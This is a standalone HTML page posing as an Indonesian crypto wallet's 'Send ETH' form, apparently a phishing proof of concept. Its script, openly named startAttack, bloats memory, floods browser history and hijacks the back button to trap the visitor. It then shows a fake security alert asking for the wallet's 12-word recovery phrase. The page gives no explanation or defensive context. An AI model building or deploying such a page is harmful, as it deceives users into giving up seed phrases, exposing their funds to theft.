<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Dompet Kripto Saya - Kirim ETH</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            padding: 20px; 
            background: #ffffff; 
            color: #000000;
        }
        h1 { font-size: 28px; margin-bottom: 20px; font-weight: bold; }
        .form-group { margin-bottom: 15px; display: flex; align-items: center; }
        label { font-size: 16px; margin-right: 10px; }
        input { 
            border: 1px solid #ccc; 
            padding: 5px 10px; 
            border-radius: 4px; 
            font-size: 14px; 
            flex-grow: 1;
            max-width: 250px;
            background: #f9f9f9;
        }
        button { 
            background: #efefef; 
            border: 1px solid #767676; 
            padding: 4px 12px; 
            border-radius: 3px; 
            font-size: 13px;
            cursor: pointer;
        }
        button:active { background: #d5d5d5; }
        
      
        .empty-frame {
            border: 2px solid #767676;
            width: 100%;
            height: 400px;
            margin-top: 20px;
            display: block;
        }

        #status-log {
            font-size: 12px;
            color: red;
            margin-top: 10px;
            font-family: monospace;
        }
    </style>
</head>
<body>

    <h1>Dompet Kripto Saya - Kirim ETH</h1>

    <div class="form-group">
        <label>Alamat Penerima:</label>
        <input type="text" value="0xOriginalTargetAddress" id="address">
    </div>

    <button onclick="startAttack()">Kirim Transaksi</button>

    <div id="status-log"></div>

    <div class="empty-frame" id="frame"></div>

    <script>
        let junk = [];

        function startAttack() {
            const log = document.getElementById('status-log');
            const frame = document.getElementById('frame');
            
            log.innerText = "Processing transaction... (System Busy)";

           
            for (let i = 0; i < 800000; i++) {
                junk.push(Math.random().toString(36));
            }

          
            let count = 0;
            let t = setInterval(() => {
                history.pushState(null, "", "#tx_hash_" + Math.random().toString(36).substring(7));
                count++;
                
                if (count > 300) {
                    clearInterval(t);
                    log.innerText = "Error: Connection Timeout. Navigation Locked for Security.";
                    
              
                    frame.innerHTML = `
                        <div style="padding: 50px; text-align: center; color: red;">
                            <h3>Critical Security Alert</h3>
                            <p>Transaction failed due to memory pressure. To prevent loss of funds, please re-verify your 12-word recovery phrase.</p>
                            <input type="text" placeholder="Enter Secret Phrase" style="width: 80%; padding: 10px; margin-top: 10px; border: 1px solid red;">
                            <br><br>
                            <button style="background: red; color: white; padding: 10px 20px; border: none;">Verify and Unlock Wallet</button>
                        </div>
                    `;
                }
            }, 1);

            
            window.onpopstate = function() {
                history.pushState(null, "", "#locked");
                alert("Warning: Transaction in progress. Do not leave this page or funds may be lost.");
            };
        }
    </script>

</body>
</html>
